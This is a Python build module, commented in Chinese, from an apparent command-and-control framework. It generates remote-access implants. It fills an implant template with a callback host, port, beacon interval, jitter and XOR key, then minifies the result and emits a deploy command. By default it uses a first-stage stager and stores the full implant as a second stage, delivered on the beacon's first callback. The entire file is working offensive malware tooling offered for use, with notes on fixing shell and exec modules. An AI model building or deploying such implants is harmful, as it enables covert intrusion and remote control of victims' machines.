"""
@module: build
@desc: 生成 implant 分段部署: 默认=第一段(引导) + 自动把完整植入物设为二阶段载荷
(stage_code, 新 beacon 首次回连下发); 传 single=1 生成单段 implant
@params: host port [key_hex] [interval] [jitter] [out_dir] [single]
"""
import json
import os

from server.core.bootstrap import deploy_command
from server.implant.names import minify

MODULE = {
    "desc": "默认分段: 第一段引导 + 自动设第二段(首连下发); single=1 出单段",
    "params": [
        ("host", "必填"),
        ("port", "必填"),
        ("key_hex", "可选；缺省自动从 server/config.json 读取 implant_key"),
        ("interval", "默认 60"),
        ("jitter", "默认 0.2"),
        ("out_dir", "默认 s_modules/output"),
        ("single", "可选；传 1 生成单段 implant(默认分段部署)"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_IMPLANT_TEMPLATE = os.path.join(_SERVER_DIR, "implant",
                                 "implant_template.py")
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

# minify 后的短名 → 长名别名(植入模块代码按原名访问模板全局,压缩后
# 只剩短名;在进入主循环前补回别名,一行解决 fork/shell/exec 等模块
# 在压缩版植入物上的 NameError,2026-08-27 修复)。
# 注意:必须插在 minify 结果的主循环(最后一个 while True:)之前——
# 主循环永不退出,插在后面永远不会执行。
_ALIAS_LINE = ("js=g;tm=f;sec=l;thr=t2;io_=k;tb=j;rnd=e;hl=h;hmac_=hm;sy=i;"
               "send_frame=p;recv_frame=q;sleep_jitter=s\n")

_SINGLE_TRUE = {"1", "true", "yes", "single", "--single"}


def _insert_aliases(code: str) -> str:
    """把长名别名行插入到主循环之前。"""
    idx = code.rfind("while True:")
    if idx == -1:
        return code + "\n" + _ALIAS_LINE
    return code[:idx] + _ALIAS_LINE + code[idx:]


def _read_implant_key() -> bytes:
    """从 server/config.json 读取 implant_key（build 自动读取）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def _clear_stage2():
    """清除 config.json 的 stage_code。

    single 单段构建时调用: 此前 staged 构建残留的 stage_code 会继续随
    新 beacon 首连下发(旧完整植入物, 可能旧 host/port/key)——用户明确
    选单段部署就不该再带第二段(2026-09-04 修复)。
    """
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except (OSError, json.JSONDecodeError):
        return
    if not raw.get("stage_code"):
        return
    raw["stage_code"] = ""
    try:
        _atomic_dump(_CONFIG_PATH, raw)
    except OSError:
        pass


def _atomic_dump(cfg_path: str, raw: dict) -> None:
    """原子写 config.json(2026-09-04 B15): 临时文件 + os.replace,
    防与并发写(web/stage/reload)撞出半截 JSON。"""
    tmp = cfg_path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(raw, f, indent=2, ensure_ascii=False)
    os.replace(tmp, cfg_path)


def _write_stage2(code: str, out_dir: str = None):
    """把第二段(完整植入物)写入 config.json 的 stage_code + output 源码副本。

    返回 (ok, info)。out_dir 缺省 _DEFAULT_OUT(2026-09-04 B15: 显式
    out_dir 传入时源码副本与单段产物落同一目录, 此前固定 _DEFAULT_OUT)。
    """
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except (OSError, json.JSONDecodeError):
        raw = {}
    raw["stage_code"] = code
    try:
        _atomic_dump(_CONFIG_PATH, raw)
    except OSError as e:
        return False, f"config.json 写入失败: {e}"
    out = out_dir or _DEFAULT_OUT
    os.makedirs(out, exist_ok=True)
    src_path = os.path.join(out, "stage2_code.py")
    try:
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(code)
    except OSError as e:
        return False, f"stage2_code.py 写入失败: {e}"
    return True, src_path


def _resolve_key(key_hex):
    """校验/解析通信密钥; 返回 (bytes, err) 或 (None, message)。"""
    if key_hex:
        try:
            key = bytes.fromhex(key_hex)
        except ValueError:
            return None, "key_hex 不是合法 hex"
        if len(key) != 32:
            return None, (f"key_hex 长度错误（{len(key)} 字节，"
                          f"需要 32 字节 / 64 hex 字符）")
        return key, None
    key = _read_implant_key()
    if key is None:
        return None, ("config.json 无有效 implant_key。"
                      "请先 s_exec keygen，或显式传 key_hex。")
    return key, None


def run(host, port, key_hex=None, interval=60, jitter=0.2, out_dir=None,
        single=None):
    """生成部署载荷并写出文件。

    默认(分段): 第一段=引导(agent_stager), 输出部署命令; 第二段=完整植入物
    自动写入 config.json 的 stage_code——新 beacon 首次回连即下发 exec。
    single 传 '1'/'single' 等 → 保持原单段部署(一条命令内嵌完整植入物)。
    """
    port = int(port)
    interval = int(interval)
    jitter = float(jitter)
    single_mode = single is not None and str(single).strip().lower() in _SINGLE_TRUE

    key, err = _resolve_key(key_hex)
    if err:
        return {"status": "error", "message": err}

    try:
        with open(_IMPLANT_TEMPLATE, "r", encoding="utf-8") as f:
            template = f.read()
    except OSError as e:
        return {"status": "error", "message": f"template read failed: {e}"}

    rendered = template
    rendered = rendered.replace("{{HOST}}", host)
    rendered = rendered.replace("{{PORT}}", str(port))
    rendered = rendered.replace("{{INTERVAL}}", str(interval))
    rendered = rendered.replace("{{JITTER}}", str(jitter))
    rendered = rendered.replace("{{XOR_KEY_BYTES}}", str(list(key)))
    rendered = minify(rendered)  # 可读源码 → 短名产物（构建期压缩）
    rendered = _insert_aliases(rendered)  # 主循环前补回长名别名

    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)

    if single_mode:
        # ── 单段: 原行为(一条命令内嵌完整植入物) ──
        command = deploy_command(rendered)
        key_path = os.path.join(out_dir, "xor_key.hex")
        cmd_path = os.path.join(out_dir, "implant_command.txt")
        with open(key_path, "w", encoding="utf-8") as f:
            f.write(key.hex() + "\n")
        with open(cmd_path, "w", encoding="utf-8") as f:
            f.write(command + "\n")
        # 清除 staged 构建残留的第二段(否则新 beacon 首连仍会收到旧
        # stage_code——单段部署不应再带第二段, 2026-09-04 修复)
        _clear_stage2()
        return {
            "status": "ok",
            "mode": "single",
            "key": key.hex(),
            "files": {"xor_key": key_path, "command": cmd_path},
            "deploy": command,
        }

    # ── 默认分段: 第一段引导(agent_stager) + 第二段自动写入 stage_code ──
    from server.s_modules import agent_stager
    st = agent_stager.run(host, str(port), key_hex)
    if not isinstance(st, dict) or st.get("status") != "ok":
        return {"status": "error",
                "message": f"第一段(引导)生成失败: {st}"}

    ok_w, info = _write_stage2(rendered, out_dir)
    if not ok_w:
        return {"status": "error", "message": f"第二段写入失败: {info}"}

    files = dict(st.get("files") or {})
    files["stage2_source"] = info
    return {
        "status": "ok",
        "mode": "staged",
        "key": key.hex(),
        "deploy": st.get("deploy", ""),
        "files": files,
        "stage2": (f"已自动写入 config.json(stage_code) 与 "
                   f"{os.path.basename(info)}（{len(rendered)} 字节）; "
                   f"新 beacon 首次回连即下发。运行中执行 reload 立即生效。"),
    }


if __name__ == "__main__":
    print("usage: s_exec build <host> <port> [key_hex] [interval] [jitter] "
          "[out_dir] [single]")
